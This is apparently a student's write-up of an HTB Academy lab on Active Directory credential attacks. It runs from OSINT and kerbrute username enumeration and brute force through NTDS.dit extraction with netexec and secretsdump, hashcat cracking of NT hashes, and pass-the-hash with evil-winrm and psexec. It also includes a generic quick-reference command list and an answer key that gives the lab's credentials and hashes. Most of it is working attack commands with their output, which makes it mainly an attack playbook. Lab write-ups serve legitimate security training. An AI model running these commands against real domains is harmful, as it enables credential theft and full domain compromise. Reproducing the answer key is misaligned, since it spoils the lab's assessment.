# 🛰️ Introduction

[!ABSTRACT] This guide covers the complete methodology for extracting and cracking NTDS.dit files in Active Directory environments, as demonstrated in HTB Academy's Password Attacks module.

## 🔍 Objective

[!INFO] The goal is to understand and execute a full attack path from OSINT to compromising domain credentials using NTDS.dit extraction techniques. This guide includes detailed steps for discovery, enumeration, password attacks, hash analysis, and pass-the-hash methods.

---

## 🎭 Scenario Setup

### Network Configuration
```text
10.129.202.85    ILF.local Domain Controller
```

### OSINT Results
- **John Marston**: `jmarston`
- **Carol Johnson**: `cjohnson` (Disabled Account)
- **Jennifer Stapleton**: `jstapleton`

## 🔍 Discovery and Enumeration

[!NOTE] Use OSINT to identify valid usernames. For this lab, employee names provided direct username leads.

### Method 1: User Enumeration
```bash
./kerbrute userenum -d ILF.local --dc 10.129.202.85 usernames.txt
# Output:
# [+] VALID USERNAME: jmarston@ILF.local
```

## 🔐 Password Attacks

### Method 2: Brute-Force Attack
```bash
./kerbrute bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston
# Output:
# [+] VALID LOGIN: jmarston@ILF.local:P@ssword!
```

## 📂 NTDS.dit Extraction

### Method 3: NetExec ntdsutil
```bash
netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local -M ntdsutil
# Output:
# * Extracted NTDS.dit file and SYSTEM/SAM files
```

### Method 4: Manual VSS Access
```bash
netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' --vss -M ntdsutil
# Output:
# * Extracted NTDS.dit file from Volume Shadow Copies
```

### Method 5: Impacket secretsdump
```bash
python3 secretsdump.py ILF.local/jmarston:P@ssword!@10.129.202.85 -just-dc-ntlm
# Output:
# * Extracted NTDS.dit file from the domain controller
```

## 🔓 Hash Cracking and Analysis

### Method 6: Hash Format Understanding
```bash
grep ":::" ntds_dump.txt | awk -F: '{print $1":"$4}'
# Output:
# jstapleton:161cff084477fe596a5db81874498a24
```

### Method 7: Hash Cracking
```bash
echo "161cff084477fe596a5db81874498a24" > jstapleton_hash.txt
hashcat -m 1000 jstapleton_hash.txt /usr/share/wordlists/rockyou.txt
# Output:
# 161cff084477fe596a5db81874498a24:Winter2008
```

### Method 8: Bulk Hash Processing
```bash
grep ":::" ntds_dump.txt | cut -d: -f4 > all_nt_hashes.txt

# Extract only enabled accounts
grep -iv disabled ntds_dump.txt | cut -d: -f1 > enabled_users.txt
```

## ⚔️ Pass-the-Hash Attacks

### Method 9: Direct Hash Usage
```bash
evil-winrm -i 10.129.202.85 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Lateral movement with Impacket
python3 psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@TARGET_IP

# Network-wide testing with NetExec
netexec smb SUBNET_RANGE -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## 🏆 Complete HTB Academy Attack Workflow

### Phase 1-2: Discovery and Enumeration
```bash
# 1. OSINT: Found John Marston, Carol Johnson, Jennifer Stapleton
# 2. Generate usernames with Username Anarchy
./username-anarchy John Marston > usernames.txt

# 3. Domain discovery
netexec smb 10.129.202.85  # → domain:ILF.local

# 4. Username validation
./kerbrute userenum -d ILF.local --dc 10.129.202.85 usernames.txt
# Output:
# [+] VALID USERNAME: jmarston@ILF.local
```

### Phase 3-4: Password Attack and NTDS Extraction
```bash
# 5. Password brute force
./kerbrute bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston
# Output:
# [+] VALID LOGIN: jmarston@ILF.local:P@ssword!

# 6. NTDS.dit extraction
netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local -M ntdsutil
# Output:
# All domain hashes extracted
```

### Phase 5: Hash Cracking
```bash
# 7. Extract Jennifer Stapleton's hash
# jstapleton:161cff084477fe596a5db81874498a24

# 8. Crack the hash
echo "161cff084477fe596a5db81874498a24" > jstapleton_hash.txt
hashcat -m 1000 jstapleton_hash.txt /usr/share/wordlists/rockyou.txt
# Output:
# Winter2008
```

## 📋 Quick Reference Commands

### Discovery
```bash
# Domain enumeration
netexec smb TARGET_IP

# Username enumeration  
./kerbrute userenum -d DOMAIN.local --dc TARGET_IP usernames.txt

# Password attacks
netexec smb TARGET_IP -u users.txt -p passwords.txt --continue-on-success -d DOMAIN.local
```

### NTDS.dit Extraction
```bash
# NetExec method (recommended)
netexec smb TARGET_IP -u USER -p PASS -d DOMAIN.local -M ntdsutil

# Direct extraction
netexec smb TARGET_IP -u USER -p PASS -d DOMAIN.local --ntds

# Impacket method
python3 secretsdump.py DOMAIN.local/USER:PASS@TARGET_IP -just-dc-ntlm
```

### Hash Analysis
```bash
# Extract NT hashes
grep ":::" ntds_dump.txt | cut -d: -f4 > nt_hashes.txt

# Crack with Hashcat
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt

# Pass-the-Hash
evil-winrm -i TARGET_IP -u Administrator -H NTHASH
```

## 🎯 HTB Academy Answer Key

Based on the complete walkthrough:

1. **NTDS.dit file name**: `NTDS.dit`
2. **Administrator NT hash**: `64f12cddaa88057e06a81b54e73b949b`
3. **John Marston credentials**: `jmarston:P@ssword!`
4. **Jennifer Stapleton password**: `Winter2008`

## 💡 Key Takeaways

1. **OSINT drives success** - Real employee names lead to valid usernames
2. **Username enumeration first** - Validate targets before password attacks
3. **NTDS.dit = domain ownership** - Every account's hash in one file
4. **NetExec ntdsutil** - Fastest extraction method
5. **VSS understanding** - Manual method for deeper control
6. **Pass-the-Hash** - Use hashes when cracking fails
7. **Complete methodology** - From OSINT to domain compromise

---

*This guide covers the complete NTDS.dit attack methodology as demonstrated in HTB Academy's Password Attacks module.*

---